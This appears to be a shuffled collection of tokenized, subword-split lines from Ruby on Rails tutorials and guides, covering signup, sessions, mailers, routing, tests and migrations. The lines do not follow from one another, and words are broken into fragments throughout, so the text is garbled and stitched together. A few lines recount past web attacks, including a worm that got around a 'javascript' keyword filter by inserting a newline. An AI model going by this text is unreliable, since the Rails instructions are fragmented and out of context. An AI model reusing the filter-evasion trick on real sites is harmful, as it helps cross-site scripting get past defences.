▁| ▁| ▁4 12 ▁| ▁: pre condition _ failed ▁|
▁render ▁" products / show "
▁The ▁method ▁is ▁to ▁add ▁a ▁User ▁\ emph { mailer } ▁using ▁the ▁Action ▁Mailer ▁library , ▁which ▁we ' ll ▁use ▁in ▁the ▁Users ▁controller ▁\ k ode { create } ▁action ▁to ▁send ▁an ▁email ▁with ▁an ▁activation ▁link .
▁<%= ▁f ▖ label ▁: body , ▁' Bo d y ' ▁%> :
▁With ▁the ▁code ▁from ▁Section ~\ ref { sec : users _ controller }, ▁we ▁already ▁have ▁a ▁working ▁page ▁for ▁new ▁users ▁at ▁ / users / new , ▁but ▁recall ▁from ▁Table ~\ ref { table : url _ m app ing } ▁that ▁we ▁want ▁the ▁URL ▁to ▁be ▁ / signup ▁instead .
▁### ▁ Custom ▁ Methods
▁You ▁ ra re ly ▁have ▁to ▁write ▁this ▁code ▁yourself ▖
▁Of ▁course , ▁on ▁a ▁real ▁site ▁you ▁ probably ▁would n ' t ▁want ▁to ▁ seed ▁it ▁with ▁sample ▁data , ▁but ▁I ▁include ▁it ▁here ▁for ▁purposes ▁of ▁i ll u str ation ▁( Figure ~\ ref { fig : heroku _ sample _ users }) .
▁The ▁user ▁profile ▁with ▁un style d ▁microposts .
▁Application s ▁created ▁before ▁Rails ▁4▖1 ▁uses ▁` Marshal ` ▁to ▁ serialize ▁cookie ▁values ▁into ╼ the ▁signed ▁and ▁ encrypted ▁cookie ▁ ja rs ▖
▁i ▁= ▁It em ▖ lock ▖ first
▁To ▁define ▁this ▁configuration ▁setting , ▁you ▁should ▁use ▁a ▁` m attr _ accessor ` ▁inside ╼ the ▁` Blorgh ` ▁module ▁for ▁the ▁engine ▖
▁# ▁=> ▁< option > V IS A </ option > ▁< option > M as ter C ar d </ option >
▁If ▁you ▁know ▁some one ▁else ▁who ▁uses ▁Rails , ▁try ▁as k ing ▁them ▁if ▁they ' ll ▁check ▁out ╼ your ▁work ▖
▁As ▁in ▁the ▁case ▁of ▁creating ▁users ▁( signup ), ▁the ▁first ▁step ▁in ▁creating ▁sessions ▁( signin ) ▁is ▁to ▁handle ▁\ emph { invalid } ▁input .
▁Also , ▁to ▁keep ▁it ▁simple , ▁the ▁articles ▁form ▁will ▁have ▁a ▁new ▁text ▁field ▁called ╼` author _ name `, ▁where ▁users ▁can ▁ el ec t ▁to ▁put ▁their ▁name ▖
▁( This ▁is ▁yet ▁another ▁reason ▁to ▁follow ▁the ▁Git ▁setup ▁steps ▁in ▁Section ~\ ref { sec : version _ control } ▁if ▁you ▁have n ' t ▁already ▖)
▁ { a : ▁1 } ▖ with _ indifferent _ access [" a "] ▁# ▁=> ▁1
▁in ▁Listing ~\ ref { code : account _ activation _ and _ password _ resets } .
▁Or ▁on ▁a ▁relation :
▁config ▖ assets ▖ compile ▁= ▁false
▁For ▁example , ▁in ▁Section ~\ ref { sec : rails _ server } ▁we ' ll ▁run ▁a ▁local ▁development ▁web ▁server ▁with ▁the ▁\ k ode { rails ▁server } ▁command :
▁* ▁You ▁must ▁change ▁the ▁following ▁application ▁configuration ▁setting :
▁ strip _ links (' Blog : ▁< a ▁ href =" http :// my blog ▖ com / "> Visit </ a > ▖ ')
▁a aaaaaaaaaa aaaaaaaaaaaaaaaa a aaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa "
▁Note ▁that ▁the ▁\ k ode { destroy } ▁method ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁redirect s ▁to ▁the ▁URL
▁To ▁avoid ▁this ▁complex ity , ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁standard ize s ▁on ▁the ▁excellent ▁cloud ▁development ▁environment ▁\ href { http :// c 9 ▖ io /}{ Cloud 9 } .
▁You ▁are ▁not ▁ limited ▁to ▁the ▁ s even ▁routes ▁that ▁RESTful ▁routing ▁creates ▁by ▁default ▖
▁See ▁Section ~\ ref { sec : backtrace _ silencer } ▁for ▁information ▁on ▁how ▁to ▁filter ▁this ▁ backtrace ▁to ▁eliminate ▁un w an ted ▁lines .
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts .
▁It ▁m ight ▁even ▁make ▁more ▁sense ▁to ▁use ▁an ▁\ k ode { update } ▁action , ▁but ▁the ▁activation ▁link ▁needs ▁to ▁be ▁sent ▁in ▁an ▁email ▁and ▁hence ▁should ▁involve ▁a ▁regular ▁browser ▁click , ▁which ▁issues ▁a ▁\ text tt { GET } ▁request ▁instead ▁of ▁the ▁\ text tt { PATCH } ▁request ▁required ▁by ▁the ▁\ k ode { update } ▁action .
▁A d a p ting ▁the ▁Relationship s ▁controller ▁to ▁respond ▁to ▁Ajax ▁involve s ▁adding ▁\ k ode { respond \_ to } ▁as ▁above ▁to ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁from ▁Listing ~\ ref { code : relationships _ controller _ following } .
▁We ▁can ▁enforce ▁secure ▁operations ▁by ▁always ▁creating ▁and ▁destroying ▁ dependent ▁objects ▁through ▁their ▁association .
▁As ▁a ▁rule ▁of ▁thumb , ▁except ▁p erhaps ▁for ▁ concat en ation ▁as ▁explained ▁above , ▁any ▁method ▁that ▁may ▁change ▁a ▁string ▁gives ▁you ▁an ▁un safe ▁string ▖
▁P r even ting ▁ unactivated ▁users ▁from ▁logging ▁in .
▁A ▁test ▁for ▁\ k ode { name } ▁length ▁validation ▖
▁c 1 ▖ first _ name ▁= ▁" Michael "
▁Let ' s ▁take ▁a ▁look ▁at ▁what ▁Rails ▁does ▁by ▁default ▁when ▁creating ▁a ▁new ▁resource ▁using ▁the ▁scaffold ▁generator :
▁The ▁next ▁problem ▁was ▁ MySpace ▁filter ing ▁the ▁word ▁" javascript ", ▁so ▁the ▁author ▁used ▁" ja v a & lt ; N E W L IN E & gt ; script " ▁to ▁get ▁around ▁this :
▁Rails ▁4▖1 ▁ fixed ▁these ▁issues ▁by ▁is ol ating ▁its ▁own ▁ en code r ▁from ▁the ▁JSON ▁gem ▖
▁If ▁you ▁ ob serv e ▁any ▁ st range ▁behavior ▁in ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁like ▁ man g le d ▁models ▁ ID s , ▁or ▁exception s ▁about ▁ conflict ing ▁ ID s , ▁chance s ▁are ▁you ▁ forgot ▁that ▁bit .
▁The ▁final ▁piece ▁of ▁the ▁relationships ▁p u z z le ▁is ▁to ▁add ▁a ▁\ k ode { user ▖ followers } ▁method ▁to ▁go ▁with ▁\ k ode { user ▖ following } .
▁< td > <%= ▁a ▁%></ td >
▁The ▁StaticPages ▁controller ▁with ▁added ▁\ k ode { about } ▁action .
▁S h or t ▁ summary ▁( ide ally ▁50 ▁characters ▁or ▁less )
▁#### ▁The ▁` assert _ routing ` ▁ Assertion
▁# ▁-- seed ▁ 123 4
▁S ince ▁we ' ve ▁now ▁added ▁sever al ▁custom ▁named ▁routes , ▁it ' s ▁useful ▁to ▁look ▁at ▁the ▁complete ▁list ▁of ▁the ▁routes ▁for ▁our ▁application , ▁which ▁we ▁can ▁generate ▁using ▁\ k ode { rake ▁routes } :
▁# ▁You ▁have ▁access ▁to ▁the ▁mail ▁instance ,
▁If ▁you ▁would ▁like ▁to ▁run ▁migrations ▁only ▁from ▁one ▁engine , ▁you ▁can ▁do ▁it ▁by ╼ specify ing ▁` S C O P E `:
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁un gr a m m at ical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁and ▁`` 2 ▁microposts '' ▁using ▁the ▁\ k ode { pluralize } ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : signup _ error _ messages } .
▁This ▁is ▁an ▁opt im i z ation ▁for ▁ speed , ▁as ▁creating ▁30 ▁users ▁can ▁be ▁ s low ▁on ▁some ▁systems .
▁in ▁Listing ~\ ref { code : sessions _ helper _ include } .
▁As ▁with ▁the ▁other ▁authentication ▁elements , ▁we ' ll ▁put ▁\ k ode { sign \_ out } ▁in ▁the ▁Sessions ▁helper ▁module .
▁This ▁is ▁an ▁appropriate ▁use ▁of ▁` via : ▁: all `, ▁as ▁you ▁will ▁want ▁to ▁allow ▁your ▁Rack ▁application ▁to ▁handle ▁all ▁verb s ▁as ▁it ▁consider s ▁appropriate .
▁On ce ▁you ' ve ▁verifie d ▁that ▁the ▁Heroku ▁command - line ▁interface ▁is ▁installed , ▁use ▁the ▁\ k ode { heroku } ▁command ▁to ▁log ▁in ▁and ▁add ▁your ▁ SSH ▁key :
▁This ▁can ▁be ▁trigger ed ▁by ▁explicitly ▁defined ▁named ▁routes ▁or ▁by ▁the ▁` resources ` ▁method ▖
▁[ Active ▁Record ▁was ▁describe d ▁by ▁Mar t in ▁F o w ler ]( http :// www ▖ m ar t info w ler ▖ com / ea a C at a log / active Record ▖ html )╼ in ▁his ▁book ▁ _ Pattern s ▁of ▁E nterprise ▁Application ▁ Architectur e _ ▖
▁The ▁\ href { http :// r ailscasts ▖ com / episodes / 37 - simple - search - form } { RailsCast ▁on ▁simple ▁search ▁forms } ▁will ▁help ▁get ▁you ▁started .
▁Sometimes , ▁you ▁want ▁to ▁add ▁a ▁little ▁Ajax ▁to ▁those ▁elements ,╼ and ▁Rails ▁has ▁ got ▁your ▁back ▁in ▁those ▁cases .
▁The ▁rest ▁of ▁this ▁tutorial ▁is ▁d ed icated ▁to ▁build ing ▁on ▁the ▁ strength s ▁and ▁eliminat ing ▁the ▁we a k ness es .
▁ Seri ous ly : ▁\ href { http :// r ailscasts ▖ com /}{ \ emph { RailsCasts } } .
▁Extensions ▁to ▁` Hash `
▁A ▁custom ▁Help ▁page .
▁</ form >
▁Fin ally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁To ▁apply ▁a ▁` G R O U P ▁BY ` ▁clause ▁to ▁the ▁SQL ▁fire d ▁by ▁the ▁find er , ▁you ▁can ▁specify ▁the ▁` group ` ▁method ▁on ▁the ▁find .
▁render ▁" edit "
▁If , ▁on ▁the ▁other ╼ h and , ▁you ' d ▁like ▁to ▁update ▁sever al ▁records ▁in ▁b ul k , ▁you ▁may ▁find ▁the ╼` update _ all ` ▁class ▁method ▁useful :
▁To ▁avoid ▁code ▁repetition , ▁you ▁should ▁also ▁remove ▁\ k ode { signed \_ in \_ user } ▁from ▁the ▁Users ▁controller ▁at ▁this ▁time .
▁We ▁did ▁this ▁by ▁rely ing ▁on ▁the ▁test ▁code ▁provided ▁by ▁the ▁tutorial ▁and ▁address ing ▁each ▁error ▁message ▁un til ▁the ▁test ▁suite ▁was ▁passing .
▁With ▁addition ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁we ' re ▁now ▁ready ▁to ▁change ▁the ▁layout ▁links ▁if ▁a ▁user ▁is ▁logged ▁in .
▁Listing ~\ ref { code : password _ migration } ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁╼╼ ▁\ subsection { A ▁ hashed ▁password } ▁% ▁( fold )╼ ▁\ label { sec : a _ hashed _ password }╼╼
▁On ▁Windows , ▁the ▁analogous ▁directory ▁would ▁be
▁c ▖ first _ name ▁== ▁ o ▖ customer ▖ first _ name ▁# ▁=> ▁false
▁En s ur ing ▁email ▁uniqueness ▁by ▁downcas ing ▁the ▁email ▁attribute ▖
▁The ▁result ▁of ▁calling ▁\ k ode { new } ▁on ▁a ▁class ▁is ▁an ▁object ▁of ▁that ▁class , ▁also ▁called ▁an ▁\ emph { instance } ▁of ▁the ▁class .
▁### ▁` validates _ with `
▁date :
▁after _ action ▁: set _ delivery _ options ,
▁Whi le ▁convenient ▁for ▁the ▁programmer , ▁this ▁is ▁in efficient ▁in ▁production .
▁As ▁show n ▁in ▁Listing ~\ ref { code : sendgrid _ config }, ▁you ▁will ▁also ▁have ▁to ▁define ▁a ▁\ k ode { host } ▁variable ▁with ▁the ▁address ▁of ▁your ▁production ▁website .
▁The ▁site ▁layout ▁with ▁partials ▁for ▁the ▁stylesheets ▁and ▁header .
▁It em ▁ Update ▁( 0 ▖ 4 m s ) ▁ UPDATE ▁` items ` ▁ SE T ▁` updated _ at ` ▁= ▁' 200 9 - 02 - 07 ▁ 18 : 05 : 5 6 ', ▁` name ` ▁= ▁' J one s ' ▁WHERE ▁` id ` ▁= ▁1
▁See ▁the ▁chapter ▁\ href { http :// git - s cm ▖ com / book / en / git - branch ing } { Git ▁B r an ch ing ▁in ▁\ emph { Pro ▁Git } } ▁for ▁details .
▁ s ▁= ▁" "▖ html _ safe
▁If ╼ you ▁want ▁to ▁ inspect , ▁alter ▁or ▁do ▁anything ▁else ▁with ▁the ▁` Mail :: Message ` ▁object ▁you ▁can ╼ access ▁it ▁with ▁the ▁` message ` ▁method ▁on ▁the ▁` ActionMailer :: Message Delivery ` ▁object .
▁No rm ally , ▁website s ▁run ▁on ▁ port ▁ 80 , ▁but ▁this ▁usually ▁requires ▁special ▁privilege s , ▁so ▁it ' s ▁convention al ▁to ▁use ▁a ▁less ▁restrict ed ▁high er - number ed ▁ port ▁for ▁the ▁development ▁server .
▁ SELECT ▁" articles " .
▁# ▁=> ▁S at , ▁01 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ .
▁Ruby ▁and ▁Rails ▁ books : ▁I ▁recommend ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P eter ▁Cooper , ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A ▖ ▁B la c k , ▁\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby } } ▁by ▁ Russ ▁O l s en , ▁and ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n ▁for ▁further ▁Ruby ▁learning , ▁and ▁\ href { http :// www ▖ a mazon ▖ com / gp / product /0321 60 16 6 1 }{\ emph { The ▁Rails ~ 3 ▁Way } } ▁by ▁O b i e ▁F er n and e z ▁and ▁\ emph { Rails ~ 3 ▁in ▁Action } ▁( w a it ▁for ▁the ▁second ▁ edition ) ▁by ▁ Ryan ▁B ig g ▁and ▁ Y e h u d a ▁ K at z ▁for ▁more ▁about ▁Rails .
▁The ▁result ing ▁ augment ed ▁data ▁model ▁for ▁microposts ▁appears ▁in ▁Figure ~\ ref { fig : micropost _ model _ picture } .
▁def ▁ calculate _ ship p ing _ cha r ge s ( order )
▁Using ▁Rails ' ▁default ▁plural i z ation ▁convention , ▁the ▁set ▁of ▁all ▁users ▁following ▁a ▁given ▁user ▁is ▁that ▁user ' s ▁\ emph { followers }, ▁and ▁\ k ode { h ob be s ▖ followers } ▁is ▁an ▁array ▁of ▁those ▁users .
▁Some ▁Rails ▁ shortcuts .
▁D ue ▁to ▁this , ▁our ╼` Comments Controller ` ▁is ▁there ▁to ▁provide ▁a ▁method ▁to ▁create ▁comments ▁and ▁delete ╼ s p a m ▁comments ▁when ▁they ▁ ar r ive .
▁ Destroy ing ▁a ▁user .
▁E x ist ence ▁of ▁Object s
▁Let ' s ▁ drop ▁into ▁the ▁console ▁to ▁see ▁the ▁effect s ▁of ▁adding ▁a ▁validation ▁to ▁our ▁User ▁model
▁N either ▁the ▁tests ▁no r ▁the ▁validation ▁will ▁be ▁ ex ha us tive , ▁just ▁good ▁enough ▁to ▁accept ▁most ▁valid ▁email ▁addresses ▁and ▁reject ▁most ▁invalid ▁one s .
▁If ▁you ▁use ▁a ▁gra ph ical ▁editor ▁such ▁as ▁S ublime ▁Text , ▁ TextMate , ▁g V im , ▁or ▁M ac V im , ▁you ▁need ▁to ▁use ▁a ▁flag ▁to ▁make ▁sure ▁that ▁the ▁editor ▁ st a y s ▁attached ▁to ▁the ▁ s hell ▁instead ▁of ▁ de t a ch ing ▁immediately
▁( Note ▁the ▁\ k ode { belongs \_ to } ▁line ▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation }, ▁which ▁is ▁generated ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration } .
▁in ▁Listing ~\ ref { code : basic _ signup _ tests } .
▁This ▁means ▁we ▁can ▁use ▁\ k ode { following \_ id s } ▁by ▁itself .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁its ▁foreign ▁key ▁will ▁be ▁set , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁If ▁it ▁does ▁` ArgumentError ` ▁is ▁raised .
▁use ▁ ActionDispatch :: Re load er
▁ sunday
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁In ▁the ▁example ▁above ▁that ' s ▁" contributors " .
▁# ▁check ▁< tt > collection ▖ length ▖ zero ? </ tt > .
▁( Not ▁all ▁of ▁these ▁rules ▁apply ▁to ▁the ▁Home ▁page , ▁but ▁each ▁rule ▁here ▁will ▁be ▁used ▁at ▁some ▁point ▁in ▁the ▁sample ▁application ▖)
▁# ▁=> ▁{" A " =>1 }
▁with ▁the ▁( slightly ) ▁more ▁express ive
▁The ▁main ▁ body ▁of ▁the ▁view ▁will ▁always ▁render ▁into ▁the ▁un name d ▁` yield ` ▖
▁ Most ▁important ▁of ▁these ▁are ▁of ▁course ▁the ▁controller , ▁located ▁at ╼` app / controllers / welcome _ controller ▖ rb ` ▁and ▁the ▁view , ▁located ▁at ╼` app / views / welcome / index ▖ html ▖ erb ` .
▁### ▁The ▁` has _ one ▁: through ` ▁Association
▁Note ▁that ▁we ' ve ▁added ▁\ k ode { : password } ▁and ▁\ k ode { : password \_ confirmation } ▁to ▁the ▁initialization ▁hash ▁for ▁\ k ode { User ▖ new } :
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁In ter active ▁programming ▁course s
▁In ▁addition , ▁off - the - sh el f ▁systems ▁can ▁be ▁`` b la c k ▁ box es '' , ▁with ▁ potentially ▁mysterious ▁in n ar d s ; ▁when ▁you ▁write ▁your ▁own ▁system , ▁you ▁are ▁far ▁more ▁likely ▁to ▁understand ▁it .
▁It ' s ▁useful ▁for ▁examining , ▁e ▖ g ▖ , ▁the ▁User ▁model , ▁but ▁in ▁this ▁case ▁we ▁need ▁to ▁ inspect ▁\ k ode { params }, ▁which ▁is ▁not ▁available ▁in ▁the ▁web ▁console ▁as ▁far ▁as ▁I ▁can ▁tell ▖)
▁L uckily , ▁Rails ▁has ▁already ▁done ▁the ▁hard est ▁part ▁for ▁us , ▁because ▁\ k ode { rails ▁generate ▁controller } ▁( Listing ~\ ref { code : generating _ pages }) ▁automatically ▁generated ▁a ▁test ▁file ▁to ▁get ▁us ▁started :
▁For ▁example , ▁` - > ▁ { ▁ offset ( 11 ) ▁}` ▁will ▁skip ▁the ▁first ▁ 11 ▁records .
▁# ▁Return s ▁a ▁user ' s ▁status ▁feed .
▁Rails ▁partials ▁are ▁used ▁to ▁place ▁markup ▁in ▁a ▁separate ▁file ▁for ▁convenience .
▁ ╼ ▁=> ▁nil
▁It ▁may ▁not ▁function ▁correctly ▖
▁You ▁may ▁see ▁it ▁refer r ed ▁to ▁as ╼ ' inline ▁JavaScript ' :
▁We ' re ▁going ▁to ▁see ▁the ▁same ▁generator ▁that ▁we ▁used ▁before ▁when ▁creating ╼ the ▁` Article ` ▁model ▖
▁We ' ll ▁un comment ▁those ▁lines ▁and ▁write ▁passing ▁tests ▁for ▁account ▁activation ▁in ▁Section ~\ ref { sec : activation _ test _ and _ refactoring } .
▁NOTE : ▁Because ▁the ▁route r ▁uses ▁the ▁HTTP ▁verb ▁and ▁URL ▁to ▁match ▁in b ound ▁requests , ▁four ▁URLs ▁map ▁to ▁ s even ▁different ▁actions .
▁It ' s ▁best ▁not ▁to ▁rely ▁on ▁that , ▁though , ▁so ▁we ' ve ▁taken ▁the ▁extra ▁step ▁and ▁added ▁an ▁ additional ▁layer ▁of ▁security .
▁S ince ▁the ▁emphasi s ▁in ▁this ▁book ▁is ▁on ▁RSpec ▁and ▁Capybara , ▁the ▁present ation ▁that ▁follows ▁is ▁necessar ily ▁ super ficial ▁and ▁in com p let e , ▁and ▁will ▁be ▁a ▁bit ▁light ▁on ▁ explanation .
▁Create ▁a ▁select ▁tag ▁and ▁a ▁series ▁of ▁contain ed ▁option ▁tags ▁for ▁the ▁provided ▁object ▁and ▁method .
▁Implement ▁a ▁ simplified ▁version ▁of ▁this , ▁restrict ing ▁@ replies ▁to ▁appear ▁only ▁in ▁the ▁feed s ▁of ▁the ▁re ci p i ent ▁and ▁the ▁send er .
▁ Fi ll ing ▁in ▁the ▁information ▁for ▁the ▁first ▁signup .
▁ Asset s ▁within ▁an ▁engine ▁work ▁in ▁an ▁identical ▁way ▁to ▁a ▁full ▁application ▖
▁We ' ve ▁achieve d ▁a ▁lot ▁already ▁in ▁this ▁section , ▁ generating ▁three ▁valid ▁pages ▁using ▁Rails ▁controllers ▁and ▁actions , ▁but ▁they ▁are ▁p ure ly ▁static ▁HTML ▁and ▁hence ▁don ' t ▁show ▁off ▁the ▁power ▁of ▁Rails .
▁number _ to _ percentage ( 10 0, ▁ precision : ▁0 ) ▁# ▁=> ▁100 %
▁There ' s ▁an ▁ additional ▁ com plication , ▁though : ▁we ▁expect ▁to ▁find ▁the ▁user ▁by ▁email ▁address , ▁which ▁means ▁we ▁need ▁its ▁value ▁in ▁both ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions .
▁To ▁write ▁a ▁test ▁for ▁a ▁valid ▁object , ▁we ' ll ▁create ▁an ▁initially ▁valid ▁User ▁model ▁object ▁\ k ode {@ user } ▁using ▁the ▁special ▁\ k ode { setup } ▁method ▁( d is c us s ed ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : static _ pages } ▁ exercises ), ▁which ▁automatically ▁get s ▁run ▁before ▁each ▁test ▖ ▁Because ▁\ k ode {@ user } ▁is ▁an ▁instance ▁variable , ▁it ' s ▁automatically ▁available ▁in ▁all ▁the ▁tests , ▁and ▁we ▁can ▁test ▁its ▁ validity ▁using ▁the ▁\ k ode { valid ?}\ ▁method ▁( Section ~\ ref { sec : creating _ user _ objects }) .
▁I ▁h o pe ▁for ▁both ▁our ▁ s a k es ▁that ▁it ' s ▁the ▁latter .
▁< option ▁value =" 3 "> M ▖ ▁Clark </ option >
▁=> ▁false
▁We ' ll ▁define ▁the ▁ generalized ▁version ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁from ▁Table ~\ ref { table : password _ token _ digest } ▁in ▁Section ~\ ref { sec : activating _ the _ account } .
▁Note ▁the ▁comment : ▁this ▁is ▁not ▁the ▁final ▁implementation .
▁| ▁GET ▁| ▁ / geocoder / new ▁| ▁ geocoder s # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁the ▁ geocoder ▁|
▁Even ▁better , ▁we ▁can ▁configure ▁Guard ▁so ▁that ▁when , ▁say , ▁the ▁\ k ode { home ▖ html ▖ erb } ▁file ▁is ▁ modified , ▁the ▁\ k ode { static \_ pages \_ controller \_ test ▖ rb } ▁automatically ▁run s .
▁There ▁is ▁no ▁step ▁two !
▁It ▁will ▁also ▁create ▁the ▁` search _ photos _ url ` ▁and ▁` search _ photos _ path ` ▁route ▁helpers .
▁The ▁idea ▁of ▁the ▁attack ▁was ▁to ▁create ▁a ▁profile ▁page ▁named ▁" login _ home _ index _ html ", ▁so ▁the ▁URL ▁look ed ▁very ▁con v in c ing ▖
▁The ▁final ▁piece ▁of ▁our ▁password ▁machinery ▁is ▁a ▁method ▁to ▁retrieve ▁users ▁base d ▁on ▁their ▁email ▁and ▁passwords .
▁-------------- ---------------
▁gem ▁' coffee - rails ', ▁' ~ > ▁3▖1 ▖ 1 '
▁With ▁a ▁partial , ▁you ▁can ▁move ▁the ▁code ▁for ▁rendering ▁a ▁particular ▁piece ▁of ▁a ▁response ▁to ▁its ▁own ▁file .
▁Be side s ▁these ▁usual ▁middleware , ▁you ▁can ▁add ▁your ▁own ▁by ▁using ▁the ▁` config ▖ middleware ▖ use ` ▁method :
▁In ▁terms ▁of ▁symbols ▁as ▁hash ▁keys , ▁we ▁can ▁define ▁a ▁\ k ode { user } ▁hash ▁as ▁follows :
▁would ▁respond ▁to ▁the ▁URL ▁ / users / t ig ers ▁( pre sum ably ▁to ▁display ▁all ▁the ▁t ig ers ▁in ▁our ▁application )
▁This ▁guide ▁cover s ▁the ▁configuration ▁and ▁initialization ▁features ▁available ▁to ▁Rails ▁applications .
▁This ▁pattern ▁is ▁true ▁of ▁every ▁Ruby ▁object : ▁t ra ce ▁back ▁the ▁class ▁hierarchy ▁far ▁enough ▁and ▁every ▁class ▁in ▁Ruby ▁ ultimate ly ▁inherit s ▁from ▁\ k ode { BasicObject }, ▁which ▁has ▁no ▁ super class ▁itself .
▁Using ▁\ k ode { validates ▁: uniqueness } ▁does ▁not ▁guarantee ▁uniqueness .
▁This ▁make s ▁the ▁association ▁in d ir ec t ly , ▁through ▁a ▁join ▁model :
▁As ▁a ▁first ▁step ▁toward ▁construct ing ▁a ▁data ▁model ▁for ▁following ▁users , ▁let ' s ▁examine ▁a ▁typical ▁case .
▁These ▁methods ▁should ▁not ▁be ▁used ▁in ▁ordinar y ▁views ▖
▁config ▖ after _ initialize ▁do
▁These ▁steps ▁are ▁also ▁available ▁in ▁individual ▁release ▁ guides .
▁This ▁will ▁call ▁` stylesheet _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁The ▁Users ▁controller ▁with ▁a ▁\ k ode { show } ▁action .
▁The ▁call ▁to ▁\ k ode { order } ▁ensure s ▁that ▁we ▁find ▁the ▁first ▁ s i x ▁users ▁that ▁were ▁created .
▁{" a " ▁=> ▁1, ▁a : ▁2}▖ symbolize _ keys
▁In c or p or ating ▁\ k ode { assert \_ difference } ▁into ▁the ▁file ▁from ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } ▁yields ▁the ▁test ▁show n ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } .
▁* ▁` where `
▁* ▁` d is able _ dependency _ load ing ` ▁D is able s ▁the ▁automatic ▁ dependency ▁loading ▁if ▁the ▁` config ▖ eager _ load ` ▁is ▁set ▁to ▁true .
▁# ▁ SELECT ▁id ▁FROM ▁clients ▁WHERE ▁active ▁= ▁1
▁They ▁will ▁automatically ▁when ▁the ▁ parent ▁object ▁is ▁saved .
▁P o s s ible ▁values ▁are ▁`: c lo sure `, ▁`: uglifier ` ▁and ▁`: yui ` ▁which ▁require ▁the ▁use ▁of ▁the ▁` c lo sure - compile r `, ▁` uglifier ` ▁or ▁` yui - compressor ` ▁gems ▁respectively .
▁Person ▖ id s
▁As ▁you ▁proceed ▁through ▁the ▁rest ▁of ▁the ▁book , ▁I ▁recommend ▁push ing ▁and ▁ deploying ▁the ▁application ▁regular ly , ▁which ▁automatically ▁make s ▁remote ▁back up s ▁and ▁let s ▁you ▁catch ▁any ▁production ▁errors ▁as ▁soon ▁as ▁possible .
▁To ▁specify ▁a ▁ dependency ▁that ▁should ▁be ▁installed ▁with ▁the ▁engine ▁during ▁a ╼ tr ad it ion al ▁` gem ▁install `, ▁specify ▁it ▁inside ▁the ▁` Gem :: Specific ation ` ▁block ╼ in side ▁the ▁` ▖ gem spec ` ▁file ▁in ▁the ▁engine :
▁It ' s ▁used ▁in ▁this ▁example ▁to ╼ display ▁a ▁small ▁number ▁next ▁to ▁each ▁comment ▁when ▁it ' s ▁created .
▁* ▁` ActionDispatch :: Request I d ` ▁make s ▁a ▁unique ▁X - Request - I d ▁header ▁available ▁to ▁the ▁response ▁and ▁enable s ▁the ▁` ActionDispatch :: Request # u u id ` ▁method .
▁As ▁a ▁result , ▁Rails ▁supports ▁all ▁four ▁of ▁the ▁request ▁types ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE } .
▁ monday
▁Note ▁that ▁we ▁expect ▁to ▁redirect ▁users ▁to ▁the ▁root ▁path ▁instead ▁of ▁the ▁login ▁path ▁because ▁a ▁user ▁try ing ▁to ▁edit ▁a ▁different ▁user ▁would ▁already ▁be ▁logged ▁in .
▁This ▁is ▁equivalent ▁to ▁visit ing ▁the ▁signup ▁page ▁and ▁ submitting ▁blank ▁signup ▁information ▁( which ▁is ▁invalid ) .
▁# ▁Generate s ▁a ▁ datetime ▁select ▁that ▁defaults ▁to ▁ today ▁( no ▁specified ▁ datetime )
▁ Make ▁a ▁Contact ▁page ▁for ▁the ▁sample ▁app .
▁In ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁we ' ll ▁handle ▁the ▁case ▁of ╼ n on - logged - in ▁users ▁who ▁try ▁to ▁access ▁a ▁ protected ▁page ▁to ▁which ▁they ▁m ight ▁normal ly ▁have ▁access .
